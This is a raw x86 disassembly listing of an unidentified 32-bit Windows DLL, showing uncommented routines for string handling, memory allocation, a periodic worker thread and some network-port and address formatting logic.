10003158:	8b f0                	mov    %eax,%esi
1000315a:	85 f6                	test   %esi,%esi
1000315c:	74 13                	je     0x10003171
1000315e:	ff 75 0c             	pushl  0xc(%ebp)
10003161:	ff 75 08             	pushl  0x8(%ebp)
10003164:	e8 23 11 00 00       	call   0x1000428c
10003169:	56                   	push   %esi
1000316a:	8b d8                	mov    %eax,%ebx
1000316c:	e8 5e 0f 00 00       	call   0x100040cf
10003171:	5e                   	pop    %esi
10003172:	8b c3                	mov    %ebx,%eax
10003174:	5b                   	pop    %ebx
10003175:	5d                   	pop    %ebp
10003176:	c2 08 00             	ret    $0x8
10003179:	05 dc 03 00 00       	add    $0x3dc,%eax
1000317e:	50                   	push   %eax
1000317f:	ff 15 00 e1 00 10    	call   *0x1000e100
10003185:	c3                   	ret    
10003186:	05 dc 03 00 00       	add    $0x3dc,%eax
1000318b:	50                   	push   %eax
1000318c:	ff 15 60 e1 00 10    	call   *0x1000e160
10003192:	c3                   	ret    
10003193:	55                   	push   %ebp
10003194:	8b ec                	mov    %esp,%ebp
10003196:	51                   	push   %ecx
10003197:	8b 45 08             	mov    0x8(%ebp),%eax
1000319a:	e8 da ff ff ff       	call   0x10003179
1000319f:	85 c0                	test   %eax,%eax
100031a1:	74 14                	je     0x100031b7
100031a3:	ff 75 08             	pushl  0x8(%ebp)
100031a6:	e8 cd fe ff ff       	call   0x10003078
100031ab:	85 c0                	test   %eax,%eax
100031ad:	74 f4                	je     0x100031a3
100031af:	8b 45 08             	mov    0x8(%ebp),%eax
100031b2:	e8 cf ff ff ff       	call   0x10003186
100031b7:	59                   	pop    %ecx
100031b8:	5d                   	pop    %ebp
100031b9:	c2 04 00             	ret    $0x4
100031bc:	55                   	push   %ebp
100031bd:	8b ec                	mov    %esp,%ebp
100031bf:	85 c9                	test   %ecx,%ecx
100031c1:	74 10                	je     0x100031d3
100031c3:	ff 75 10             	pushl  0x10(%ebp)
100031c6:	ff 75 0c             	pushl  0xc(%ebp)
100031c9:	ff 75 08             	pushl  0x8(%ebp)
100031cc:	e8 07 00 00 00       	call   0x100031d8
100031d1:	5d                   	pop    %ebp
100031d2:	c3                   	ret    
100031d3:	6a 57                	push   $0x57
100031d5:	58                   	pop    %eax
100031d6:	5d                   	pop    %ebp
100031d7:	c3                   	ret    
100031d8:	55                   	push   %ebp
100031d9:	8b ec                	mov    %esp,%ebp
100031db:	33 c0                	xor    %eax,%eax
100031dd:	8d 91 c4 02 00 00    	lea    0x2c4(%ecx),%edx
100031e3:	39 72 fc             	cmp    %esi,-0x4(%edx)
100031e6:	75 05                	jne    0x100031ed
100031e8:	83 3a 00             	cmpl   $0x0,(%edx)
100031eb:	75 12                	jne    0x100031ff
100031ed:	40                   	inc    %eax
100031ee:	83 c2 0c             	add    $0xc,%edx
100031f1:	83 f8 10             	cmp    $0x10,%eax
100031f4:	7c ed                	jl     0x100031e3
100031f6:	b8 46 06 00 00       	mov    $0x646,%eax
100031fb:	5d                   	pop    %ebp
100031fc:	c2 0c 00             	ret    $0xc
100031ff:	ff 75 10             	pushl  0x10(%ebp)
10003202:	8d 50 3b             	lea    0x3b(%eax),%edx
10003205:	6b c0 0c             	imul   $0xc,%eax,%eax
10003208:	ff b4 08 c8 02 00 00 	pushl  0x2c8(%eax,%ecx,1)
1000320f:	6b d2 0c             	imul   $0xc,%edx,%edx
10003212:	ff 75 0c             	pushl  0xc(%ebp)
10003215:	ff 75 08             	pushl  0x8(%ebp)
10003218:	56                   	push   %esi
10003219:	ff 14 0a             	call   *(%edx,%ecx,1)
1000321c:	eb dd                	jmp    0x100031fb
1000321e:	56                   	push   %esi
1000321f:	8d 77 08             	lea    0x8(%edi),%esi
10003222:	e8 9f 70 00 00       	call   0x1000a2c6
10003227:	8b 35 5c e1 00 10    	mov    0x1000e15c,%esi
1000322d:	83 4f 20 ff          	orl    $0xffffffff,0x20(%edi)
10003231:	83 a7 b8 02 00 00 00 	andl   $0x0,0x2b8(%edi)
10003238:	83 a7 c0 03 00 00 00 	andl   $0x0,0x3c0(%edi)
1000323f:	8d 87 90 03 00 00    	lea    0x390(%edi),%eax
10003245:	50                   	push   %eax
10003246:	ff d6                	call   *%esi
10003248:	8d 87 a8 03 00 00    	lea    0x3a8(%edi),%eax
1000324e:	50                   	push   %eax
1000324f:	ff d6                	call   *%esi
10003251:	8d 87 c4 03 00 00    	lea    0x3c4(%edi),%eax
10003257:	50                   	push   %eax
10003258:	ff d6                	call   *%esi
1000325a:	8d 87 dc 03 00 00    	lea    0x3dc(%edi),%eax
10003260:	50                   	push   %eax
10003261:	ff d6                	call   *%esi
10003263:	8b f7                	mov    %edi,%esi
10003265:	e8 55 00 00 00       	call   0x100032bf
1000326a:	89 07                	mov    %eax,(%edi)
1000326c:	8b c7                	mov    %edi,%eax
1000326e:	5e                   	pop    %esi
1000326f:	c3                   	ret    
10003270:	83 7f 04 01          	cmpl   $0x1,0x4(%edi)
10003274:	75 07                	jne    0x1000327d
10003276:	8b c7                	mov    %edi,%eax
10003278:	e8 cf 06 00 00       	call   0x1000394c
1000327d:	56                   	push   %esi
1000327e:	6a 01                	push   $0x1
10003280:	8d b7 80 03 00 00    	lea    0x380(%edi),%esi
10003286:	e8 4a 6f 00 00       	call   0x1000a1d5
1000328b:	8b 35 68 e1 00 10    	mov    0x1000e168,%esi
10003291:	59                   	pop    %ecx
10003292:	8d 87 c4 03 00 00    	lea    0x3c4(%edi),%eax
10003298:	50                   	push   %eax
10003299:	ff d6                	call   *%esi
1000329b:	8d 87 90 03 00 00    	lea    0x390(%edi),%eax
100032a1:	50                   	push   %eax
100032a2:	ff d6                	call   *%esi
100032a4:	8d 87 a8 03 00 00    	lea    0x3a8(%edi),%eax
100032aa:	50                   	push   %eax
100032ab:	ff d6                	call   *%esi
100032ad:	8d 87 dc 03 00 00    	lea    0x3dc(%edi),%eax
100032b3:	50                   	push   %eax
100032b4:	ff d6                	call   *%esi
100032b6:	8d 4f 08             	lea    0x8(%edi),%ecx
100032b9:	5e                   	pop    %esi
100032ba:	e9 4b 70 00 00       	jmp    0x1000a30a
100032bf:	8d 4e 08             	lea    0x8(%esi),%ecx
100032c2:	8b 01                	mov    (%ecx),%eax
100032c4:	ff 50 08             	call   *0x8(%eax)
100032c7:	84 c0                	test   %al,%al
100032c9:	75 03                	jne    0x100032ce
100032cb:	33 c0                	xor    %eax,%eax
100032cd:	c3                   	ret    
100032ce:	83 66 04 00          	andl   $0x0,0x4(%esi)
100032d2:	68 c0 00 00 00       	push   $0xc0
100032d7:	8d 86 c0 02 00 00    	lea    0x2c0(%esi),%eax
100032dd:	6a 00                	push   $0x0
100032df:	50                   	push   %eax
100032e0:	e8 45 aa 00 00       	call   0x1000dd2a
100032e5:	83 c4 0c             	add    $0xc,%esp
100032e8:	6a 2c                	push   $0x2c
100032ea:	8d 86 80 03 00 00    	lea    0x380(%esi),%eax
100032f0:	59                   	pop    %ecx
100032f1:	e8 aa 6d 00 00       	call   0x1000a0a0
100032f6:	f7 d8                	neg    %eax
100032f8:	1b c0                	sbb    %eax,%eax
100032fa:	f7 d8                	neg    %eax
100032fc:	c3                   	ret    
100032fd:	68 f4 03 00 00       	push   $0x3f4
10003302:	e8 dd 36 00 00       	call   0x100069e4
10003307:	59                   	pop    %ecx
10003308:	c3                   	ret    
10003309:	55                   	push   %ebp
1000330a:	8b ec                	mov    %esp,%ebp
1000330c:	81 ec 00 01 00 00    	sub    $0x100,%esp
10003312:	53                   	push   %ebx
10003313:	ff 75 08             	pushl  0x8(%ebp)
10003316:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
1000331c:	68 00 01 00 00       	push   $0x100
10003321:	33 db                	xor    %ebx,%ebx
10003323:	e8 c4 fa ff ff       	call   0x10002dec
10003328:	85 c0                	test   %eax,%eax
1000332a:	75 47                	jne    0x10003373
1000332c:	56                   	push   %esi
1000332d:	57                   	push   %edi
1000332e:	8d b5 00 ff ff ff    	lea    -0x100(%ebp),%esi
10003334:	e8 22 21 00 00       	call   0x1000545b
10003339:	68 00 04 00 00       	push   $0x400
1000333e:	e8 a1 36 00 00       	call   0x100069e4
10003343:	8b f8                	mov    %eax,%edi
10003345:	59                   	pop    %ecx
10003346:	85 ff                	test   %edi,%edi
10003348:	74 27                	je     0x10003371
1000334a:	8b c6                	mov    %esi,%eax
1000334c:	57                   	push   %edi
1000334d:	50                   	push   %eax
1000334e:	e8 88 4e 00 00       	call   0x100081db
10003353:	8b f0                	mov    %eax,%esi
10003355:	59                   	pop    %ecx
10003356:	59                   	pop    %ecx
10003357:	85 f6                	test   %esi,%esi
10003359:	74 0f                	je     0x1000336a
1000335b:	56                   	push   %esi
1000335c:	57                   	push   %edi
1000335d:	ff 75 0c             	pushl  0xc(%ebp)
10003360:	e8 ab a9 00 00       	call   0x1000dd10
10003365:	83 c4 0c             	add    $0xc,%esp
10003368:	8b de                	mov    %esi,%ebx
1000336a:	57                   	push   %edi
1000336b:	e8 a3 36 00 00       	call   0x10006a13
10003370:	59                   	pop    %ecx
10003371:	5f                   	pop    %edi
10003372:	5e                   	pop    %esi
10003373:	8b c3                	mov    %ebx,%eax
10003375:	5b                   	pop    %ebx
10003376:	c9                   	leave  
10003377:	c3                   	ret    
10003378:	55                   	push   %ebp
10003379:	8b ec                	mov    %esp,%ebp
1000337b:	81 ec 14 01 00 00    	sub    $0x114,%esp
10003381:	53                   	push   %ebx
10003382:	56                   	push   %esi
10003383:	83 c0 40             	add    $0x40,%eax
10003386:	57                   	push   %edi
10003387:	50                   	push   %eax
10003388:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000338b:	e8 54 36 00 00       	call   0x100069e4
10003390:	8b f8                	mov    %eax,%edi
10003392:	33 c0                	xor    %eax,%eax
10003394:	59                   	pop    %ecx
10003395:	3b f8                	cmp    %eax,%edi
10003397:	0f 84 8b 00 00 00    	je     0x10003428
1000339d:	be 00 01 00 00       	mov    $0x100,%esi
100033a2:	56                   	push   %esi
100033a3:	88 07                	mov    %al,(%edi)
100033a5:	89 45 fc             	mov    %eax,-0x4(%ebp)
100033a8:	89 45 f8             	mov    %eax,-0x8(%ebp)
100033ab:	50                   	push   %eax
100033ac:	eb 37                	jmp    0x100033e5
100033ae:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
100033b4:	50                   	push   %eax
100033b5:	e8 5e 77 00 00       	call   0x1000ab18
100033ba:	59                   	pop    %ecx
100033bb:	85 c0                	test   %eax,%eax
100033bd:	74 1f                	je     0x100033de
100033bf:	ff 45 fc             	incl   -0x4(%ebp)
100033c2:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
100033c8:	50                   	push   %eax
100033c9:	ff 75 f4             	pushl  -0xc(%ebp)
100033cc:	e8 4b fa ff ff       	call   0x10002e1c
100033d1:	68 80 e4 00 10       	push   $0x1000e480
100033d6:	ff 75 f4             	pushl  -0xc(%ebp)
100033d9:	e8 3e fa ff ff       	call   0x10002e1c
100033de:	ff 45 f8             	incl   -0x8(%ebp)
100033e1:	56                   	push   %esi
100033e2:	ff 75 f8             	pushl  -0x8(%ebp)
100033e5:	8b 45 08             	mov    0x8(%ebp),%eax
100033e8:	8d 9d f0 fe ff ff    	lea    -0x110(%ebp),%ebx
100033ee:	e8 47 21 00 00       	call   0x1000553a
100033f3:	59                   	pop    %ecx
100033f4:	59                   	pop    %ecx
100033f5:	83 f8 06             	cmp    $0x6,%eax
100033f8:	77 b4                	ja     0x100033ae
100033fa:	33 f6                	xor    %esi,%esi
100033fc:	39 75 fc             	cmp    %esi,-0x4(%ebp)
100033ff:	7e 1e                	jle    0x1000341f
10003401:	68 80 00 00 00       	push   $0x80
10003406:	e8 db 1d 00 00       	call   0x100051e6
1000340b:	33 d2                	xor    %edx,%edx
1000340d:	f7 75 fc             	divl   -0x4(%ebp)
10003410:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10003413:	8b c7                	mov    %edi,%eax
10003415:	52                   	push   %edx
10003416:	e8 1f 21 00 00       	call   0x1000553a
1000341b:	59                   	pop    %ecx
1000341c:	59                   	pop    %ecx
1000341d:	8b f0                	mov    %eax,%esi
1000341f:	57                   	push   %edi
10003420:	e8 ee 35 00 00       	call   0x10006a13
10003425:	59                   	pop    %ecx
10003426:	8b c6                	mov    %esi,%eax
10003428:	5f                   	pop    %edi
10003429:	5e                   	pop    %esi
1000342a:	5b                   	pop    %ebx
1000342b:	c9                   	leave  
1000342c:	c3                   	ret    
1000342d:	55                   	push   %ebp
1000342e:	8b ec                	mov    %esp,%ebp
10003430:	81 ec 44 01 00 00    	sub    $0x144,%esp
10003436:	53                   	push   %ebx
10003437:	56                   	push   %esi
10003438:	57                   	push   %edi
10003439:	8b f8                	mov    %eax,%edi
1000343b:	57                   	push   %edi
1000343c:	33 f6                	xor    %esi,%esi
1000343e:	ff 15 34 e1 00 10    	call   *0x1000e134
10003444:	83 f8 16             	cmp    $0x16,%eax
10003447:	0f 8e ff 00 00 00    	jle    0x1000354c
1000344d:	68 84 e4 00 10       	push   $0x1000e484
10003452:	8d 44 38 f4          	lea    -0xc(%eax,%edi,1),%eax
10003456:	50                   	push   %eax
10003457:	ff 15 78 e1 00 10    	call   *0x1000e178
1000345d:	85 c0                	test   %eax,%eax
1000345f:	0f 85 e7 00 00 00    	jne    0x1000354c
10003465:	57                   	push   %edi
10003466:	bf 00 01 00 00       	mov    $0x100,%edi
1000346b:	57                   	push   %edi
1000346c:	8d 8d c0 fe ff ff    	lea    -0x140(%ebp),%ecx
10003472:	88 85 c0 fe ff ff    	mov    %al,-0x140(%ebp)
10003478:	e8 6f f9 ff ff       	call   0x10002dec
1000347d:	85 c0                	test   %eax,%eax
1000347f:	0f 85 c7 00 00 00    	jne    0x1000354c
10003485:	68 00 08 00 00       	push   $0x800
1000348a:	e8 55 35 00 00       	call   0x100069e4
1000348f:	8b d8                	mov    %eax,%ebx
10003491:	59                   	pop    %ecx
10003492:	85 db                	test   %ebx,%ebx
10003494:	0f 84 b2 00 00 00    	je     0x1000354c
1000349a:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
100034a0:	53                   	push   %ebx
100034a1:	50                   	push   %eax
100034a2:	e8 62 fe ff ff       	call   0x10003309
100034a7:	59                   	pop    %ecx
100034a8:	59                   	pop    %ecx
100034a9:	85 c0                	test   %eax,%eax
100034ab:	0f 84 82 00 00 00    	je     0x10003533
100034b1:	83 f8 05             	cmp    $0x5,%eax
100034b4:	75 26                	jne    0x100034dc
100034b6:	68 94 e4 00 10       	push   $0x1000e494
100034bb:	6a 40                	push   $0x40
100034bd:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
100034c2:	58                   	pop    %eax
100034c3:	8d 4d c0             	lea    -0x40(%ebp),%ecx
100034c6:	c6 43 05 00          	movb   $0x0,0x5(%ebx)
100034ca:	e8 d3 f9 ff ff       	call   0x10002ea2
100034cf:	53                   	push   %ebx
100034d0:	6a 40                	push   $0x40
100034d2:	8d 7d c0             	lea    -0x40(%ebp),%edi
100034d5:	e8 42 f9 ff ff       	call   0x10002e1c
100034da:	eb 51                	jmp    0x1000352d
100034dc:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
100034e2:	51                   	push   %ecx
100034e3:	53                   	push   %ebx
100034e4:	e8 8f fe ff ff       	call   0x10003378
100034e9:	59                   	pop    %ecx
100034ea:	59                   	pop    %ecx
100034eb:	85 c0                	test   %eax,%eax
100034ed:	74 29                	je     0x10003518
100034ef:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100034f2:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
100034f8:	50                   	push   %eax
100034f9:	57                   	push   %edi
100034fa:	e8 ed f8 ff ff       	call   0x10002dec
100034ff:	85 c0                	test   %eax,%eax
10003501:	75 15                	jne    0x10003518
10003503:	68 a4 e4 00 10       	push   $0x1000e4a4
10003508:	57                   	push   %edi
10003509:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000350c:	e8 0b f9 ff ff       	call   0x10002e1c
10003511:	8b f0                	mov    %eax,%esi
10003513:	f7 de                	neg    %esi
10003515:	1b f6                	sbb    %esi,%esi
10003517:	46                   	inc    %esi
10003518:	68 ac e4 00 10       	push   $0x1000e4ac
1000351d:	6a 40                	push   $0x40
1000351f:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
10003524:	58                   	pop    %eax
10003525:	8d 4d c0             	lea    -0x40(%ebp),%ecx
10003528:	e8 75 f9 ff ff       	call   0x10002ea2
1000352d:	8d 45 c0             	lea    -0x40(%ebp),%eax
10003530:	50                   	push   %eax
10003531:	eb 05                	jmp    0x10003538
10003533:	68 d0 e4 00 10       	push   $0x1000e4d0
10003538:	68 cc e4 00 10       	push   $0x1000e4cc
1000353d:	ff 75 08             	pushl  0x8(%ebp)
10003540:	e8 93 03 00 00       	call   0x100038d8
10003545:	53                   	push   %ebx
10003546:	e8 c8 34 00 00       	call   0x10006a13
1000354b:	59                   	pop    %ecx
1000354c:	5f                   	pop    %edi
1000354d:	8b c6                	mov    %esi,%eax
1000354f:	5e                   	pop    %esi
10003550:	5b                   	pop    %ebx
10003551:	c9                   	leave  
10003552:	c2 08 00             	ret    $0x8
10003555:	55                   	push   %ebp
10003556:	8b ec                	mov    %esp,%ebp
10003558:	81 ec 00 01 00 00    	sub    $0x100,%esp
1000355e:	53                   	push   %ebx
1000355f:	56                   	push   %esi
10003560:	8b 35 44 e1 00 10    	mov    0x1000e144,%esi
10003566:	57                   	push   %edi
10003567:	bf e0 93 04 00       	mov    $0x493e0,%edi
1000356c:	57                   	push   %edi
1000356d:	ff d6                	call   *%esi
1000356f:	6a 0c                	push   $0xc
10003571:	5b                   	pop    %ebx
10003572:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
10003578:	50                   	push   %eax
10003579:	ff 75 08             	pushl  0x8(%ebp)
1000357c:	b8 e8 e4 00 10       	mov    $0x1000e4e8,%eax
10003581:	e8 a7 fe ff ff       	call   0x1000342d
10003586:	57                   	push   %edi
10003587:	ff d6                	call   *%esi
10003589:	4b                   	dec    %ebx
1000358a:	75 e6                	jne    0x10003572
1000358c:	5f                   	pop    %edi
1000358d:	5e                   	pop    %esi
1000358e:	33 c0                	xor    %eax,%eax
10003590:	5b                   	pop    %ebx
10003591:	c9                   	leave  
10003592:	c2 04 00             	ret    $0x4
10003595:	8b 86 c0 03 00 00    	mov    0x3c0(%esi),%eax
1000359b:	85 c0                	test   %eax,%eax
1000359d:	74 1d                	je     0x100035bc
1000359f:	6a 10                	push   $0x10
100035a1:	50                   	push   %eax
100035a2:	ff 15 38 e1 00 10    	call   *0x1000e138
100035a8:	85 c0                	test   %eax,%eax
100035aa:	74 04                	je     0x100035b0
100035ac:	33 c0                	xor    %eax,%eax
100035ae:	40                   	inc    %eax
100035af:	c3                   	ret    
100035b0:	ff b6 c0 03 00 00    	pushl  0x3c0(%esi)
100035b6:	ff 15 50 e1 00 10    	call   *0x1000e150
100035bc:	6a 00                	push   $0x0
100035be:	6a 00                	push   $0x0
100035c0:	56                   	push   %esi
100035c1:	68 55 35 00 10       	push   $0x10003555
100035c6:	6a 00                	push   $0x0
100035c8:	6a 00                	push   $0x0
100035ca:	ff 15 54 e1 00 10    	call   *0x1000e154
100035d0:	89 86 c0 03 00 00    	mov    %eax,0x3c0(%esi)
100035d6:	c3                   	ret    
100035d7:	55                   	push   %ebp
100035d8:	8b ec                	mov    %esp,%ebp
100035da:	81 ec 00 04 00 00    	sub    $0x400,%esp
100035e0:	56                   	push   %esi
100035e1:	68 00 04 00 00       	push   $0x400
100035e6:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
100035ec:	50                   	push   %eax
100035ed:	6a ff                	push   $0xffffffff
100035ef:	ff 75 08             	pushl  0x8(%ebp)
100035f2:	33 f6                	xor    %esi,%esi
100035f4:	56                   	push   %esi
100035f5:	56                   	push   %esi
100035f6:	ff 15 fc e0 00 10    	call   *0x1000e0fc
100035fc:	83 f8 04             	cmp    $0x4,%eax
100035ff:	7e 43                	jle    0x10003644
10003601:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
10003607:	50                   	push   %eax
10003608:	e8 7b 23 00 00       	call   0x10005988
1000360d:	59                   	pop    %ecx
1000360e:	83 f8 ff             	cmp    $0xffffffff,%eax
10003611:	74 31                	je     0x10003644
10003613:	8b c8                	mov    %eax,%ecx
10003615:	c1 e9 18             	shr    $0x18,%ecx
10003618:	51                   	push   %ecx
10003619:	8b d0                	mov    %eax,%edx
1000361b:	c1 ea 10             	shr    $0x10,%edx
1000361e:	b9 ff 00 00 00       	mov    $0xff,%ecx
10003623:	23 d1                	and    %ecx,%edx
10003625:	52                   	push   %edx
10003626:	8b d0                	mov    %eax,%edx
10003628:	c1 ea 08             	shr    $0x8,%edx
1000362b:	23 d1                	and    %ecx,%edx
1000362d:	52                   	push   %edx
1000362e:	0f b6 c0             	movzbl %al,%eax
10003631:	50                   	push   %eax
10003632:	68 2c e5 00 10       	push   $0x1000e52c
10003637:	ff 75 0c             	pushl  0xc(%ebp)
1000363a:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10003640:	83 c4 18             	add    $0x18,%esp
10003643:	46                   	inc    %esi
10003644:	8b c6                	mov    %esi,%eax
10003646:	5e                   	pop    %esi
10003647:	c9                   	leave  
10003648:	c3                   	ret    
10003649:	55                   	push   %ebp
1000364a:	8b ec                	mov    %esp,%ebp
1000364c:	81 ec 04 01 00 00    	sub    $0x104,%esp
10003652:	8b 45 08             	mov    0x8(%ebp),%eax
10003655:	53                   	push   %ebx
10003656:	56                   	push   %esi
10003657:	57                   	push   %edi
10003658:	6a 50                	push   $0x50
1000365a:	33 ff                	xor    %edi,%edi
1000365c:	e8 3f 1e 00 00       	call   0x100054a0
10003661:	59                   	pop    %ecx
10003662:	ff 75 08             	pushl  0x8(%ebp)
10003665:	0f b7 c0             	movzwl %ax,%eax
10003668:	bb 00 01 00 00       	mov    $0x100,%ebx
1000366d:	53                   	push   %ebx
1000366e:	8d 8d fc fe ff ff    	lea    -0x104(%ebp),%ecx
10003674:	89 45 fc             	mov    %eax,-0x4(%ebp)
10003677:	e8 70 f7 ff ff       	call   0x10002dec
1000367c:	8d b5 fc fe ff ff    	lea    -0x104(%ebp),%esi
10003682:	e8 d4 1d 00 00       	call   0x1000545b
10003687:	8b c6                	mov    %esi,%eax
10003689:	50                   	push   %eax
1000368a:	ff 15 34 e1 00 10    	call   *0x1000e134
10003690:	8d 84 05 fc fe ff ff 	lea    -0x104(%ebp,%eax,1),%eax
10003697:	8a 48 ff             	mov    -0x1(%eax),%cl
1000369a:	80 f9 30             	cmp    $0x30,%cl
1000369d:	7c 05                	jl     0x100036a4
1000369f:	80 f9 39             	cmp    $0x39,%cl
100036a2:	7e 0b                	jle    0x100036af
100036a4:	80 f9 70             	cmp    $0x70,%cl
100036a7:	75 14                	jne    0x100036bd
100036a9:	80 78 fe 32          	cmpb   $0x32,-0x2(%eax)
100036ad:	75 0e                	jne    0x100036bd
100036af:	ff 75 08             	pushl  0x8(%ebp)
100036b2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100036b5:	53                   	push   %ebx
100036b6:	e8 31 f7 ff ff       	call   0x10002dec
100036bb:	eb 2e                	jmp    0x100036eb
100036bd:	b8 bb 01 00 00       	mov    $0x1bb,%eax
100036c2:	66 39 45 fc          	cmp    %ax,-0x4(%ebp)
100036c6:	75 2a                	jne    0x100036f2
100036c8:	ff 75 0c             	pushl  0xc(%ebp)
100036cb:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
100036d1:	50                   	push   %eax
100036d2:	e8 00 ff ff ff       	call   0x100035d7
100036d7:	59                   	pop    %ecx
100036d8:	59                   	pop    %ecx
100036d9:	85 c0                	test   %eax,%eax
100036db:	74 15                	je     0x100036f2
100036dd:	8b 7d 0c             	mov    0xc(%ebp),%edi
100036e0:	68 a4 e4 00 10       	push   $0x1000e4a4
100036e5:	53                   	push   %ebx
100036e6:	e8 31 f7 ff ff       	call   0x10002e1c
100036eb:	8b f8                	mov    %eax,%edi
100036ed:	f7 df                	neg    %edi
100036ef:	1b ff                	sbb    %edi,%edi
100036f1:	47                   	inc    %edi
100036f2:	8b c7                	mov    %edi,%eax
100036f4:	5f                   	pop    %edi
100036f5:	5e                   	pop    %esi
100036f6:	5b                   	pop    %ebx
100036f7:	c9                   	leave  
100036f8:	c3                   	ret    
100036f9:	55                   	push   %ebp
100036fa:	8b ec                	mov    %esp,%ebp
100036fc:	51                   	push   %ecx
100036fd:	ff 75 10             	pushl  0x10(%ebp)
10003700:	8b 45 0c             	mov    0xc(%ebp),%eax
10003703:	ff 75 08             	pushl  0x8(%ebp)
10003706:	e8 22 fd ff ff       	call   0x1000342d
1000370b:	85 c0                	test   %eax,%eax
1000370d:	75 11                	jne    0x10003720
1000370f:	ff 75 10             	pushl  0x10(%ebp)
10003712:	ff 75 0c             	pushl  0xc(%ebp)
10003715:	e8 2f ff ff ff       	call   0x10003649
1000371a:	59                   	pop    %ecx
1000371b:	59                   	pop    %ecx
1000371c:	85 c0                	test   %eax,%eax
1000371e:	74 03                	je     0x10003723
10003720:	33 c0                	xor    %eax,%eax
10003722:	40                   	inc    %eax
10003723:	59                   	pop    %ecx
10003724:	5d                   	pop    %ebp
10003725:	c2 0c 00             	ret    $0xc
10003728:	55                   	push   %ebp
10003729:	8b ec                	mov    %esp,%ebp
1000372b:	83 e4 f8             	and    $0xfffffff8,%esp
1000372e:	81 ec cc 01 00 00    	sub    $0x1cc,%esp
10003734:	83 24 24 00          	andl   $0x0,(%esp)
10003738:	53                   	push   %ebx
10003739:	56                   	push   %esi
1000373a:	57                   	push   %edi
1000373b:	8b f9                	mov    %ecx,%edi
1000373d:	8b c7                	mov    %edi,%eax
1000373f:	e8 4f 02 00 00       	call   0x10003993
10003744:	85 c0                	test   %eax,%eax
10003746:	0f 84 81 01 00 00    	je     0x100038cd
1000374c:	8b b7 b8 02 00 00    	mov    0x2b8(%edi),%esi
10003752:	85 f6                	test   %esi,%esi
10003754:	74 1d                	je     0x10003773
10003756:	e8 18 0f 00 00       	call   0x10004673
1000375b:	8b b7 b8 02 00 00    	mov    0x2b8(%edi),%esi
10003761:	85 f6                	test   %esi,%esi
10003763:	74 0e                	je     0x10003773
10003765:	8b c6                	mov    %esi,%eax
10003767:	e8 e5 18 00 00       	call   0x10005051
1000376c:	56                   	push   %esi
1000376d:	e8 db 44 00 00       	call   0x10007c4d
10003772:	59                   	pop    %ecx
10003773:	e8 00 19 00 00       	call   0x10005078
10003778:	85 c0                	test   %eax,%eax
1000377a:	74 09                	je     0x10003785
1000377c:	8b f0                	mov    %eax,%esi
1000377e:	e8 91 18 00 00       	call   0x10005014
10003783:	eb 02                	jmp    0x10003787
10003785:	33 c0                	xor    %eax,%eax
10003787:	89 87 b8 02 00 00    	mov    %eax,0x2b8(%edi)
1000378d:	85 c0                	test   %eax,%eax
1000378f:	0f 84 31 01 00 00    	je     0x100038c6
10003795:	8b c7                	mov    %edi,%eax
10003797:	e8 da 01 00 00       	call   0x10003976
1000379c:	85 c0                	test   %eax,%eax
1000379e:	74 49                	je     0x100037e9
100037a0:	ff 47 20             	incl   0x20(%edi)
100037a3:	8d 47 08             	lea    0x8(%edi),%eax
100037a6:	e8 f3 6b 00 00       	call   0x1000a39e
100037ab:	3b 47 20             	cmp    0x20(%edi),%eax
100037ae:	75 07                	jne    0x100037b7
100037b0:	83 67 20 00          	andl   $0x0,0x20(%edi)
100037b4:	ff 47 24             	incl   0x24(%edi)
100037b7:	ff 77 20             	pushl  0x20(%edi)
100037ba:	8d 4f 08             	lea    0x8(%edi),%ecx
100037bd:	e8 a9 6b 00 00       	call   0x1000a36b
100037c2:	ff 30                	pushl  (%eax)
100037c4:	8d 4c 24 14          	lea    0x14(%esp),%ecx
100037c8:	68 00 01 00 00       	push   $0x100
100037cd:	e8 1a f6 ff ff       	call   0x10002dec
100037d2:	8d 44 24 10          	lea    0x10(%esp),%eax
100037d6:	50                   	push   %eax
100037d7:	50                   	push   %eax
100037d8:	57                   	push   %edi
100037d9:	e8 1b ff ff ff       	call   0x100036f9
100037de:	85 c0                	test   %eax,%eax
100037e0:	74 be                	je     0x100037a0
100037e2:	8b c7                	mov    %edi,%eax
100037e4:	e8 9d 01 00 00       	call   0x10003986
100037e9:	6a 50                	push   $0x50
100037eb:	8d 44 24 14          	lea    0x14(%esp),%eax
100037ef:	e8 ac 1c 00 00       	call   0x100054a0
100037f4:	0f b7 d8             	movzwl %ax,%ebx
100037f7:	59                   	pop    %ecx
100037f8:	8d 44 24 10          	lea    0x10(%esp),%eax
100037fc:	50                   	push   %eax
100037fd:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
10003802:	b8 c4 00 00 00       	mov    $0xc4,%eax
10003807:	8d 8c 24 14 01 00 00 	lea    0x114(%esp),%ecx
1000380e:	e8 8f f6 ff ff       	call   0x10002ea2
10003813:	8d b4 24 10 01 00 00 	lea    0x110(%esp),%esi
1000381a:	e8 3c 1c 00 00       	call   0x1000545b
1000381f:	8b 8f b8 02 00 00    	mov    0x2b8(%edi),%ecx
10003825:	53                   	push   %ebx
10003826:	8b c6                	mov    %esi,%eax
10003828:	50                   	push   %eax
10003829:	33 c0                	xor    %eax,%eax
1000382b:	e8 3b 16 00 00       	call   0x10004e6b
10003830:	85 c0                	test   %eax,%eax
10003832:	74 73                	je     0x100038a7
10003834:	8d 87 28 02 00 00    	lea    0x228(%edi),%eax
1000383a:	50                   	push   %eax
1000383b:	8d 87 28 01 00 00    	lea    0x128(%edi),%eax
10003841:	50                   	push   %eax
10003842:	8d 47 28             	lea    0x28(%edi),%eax
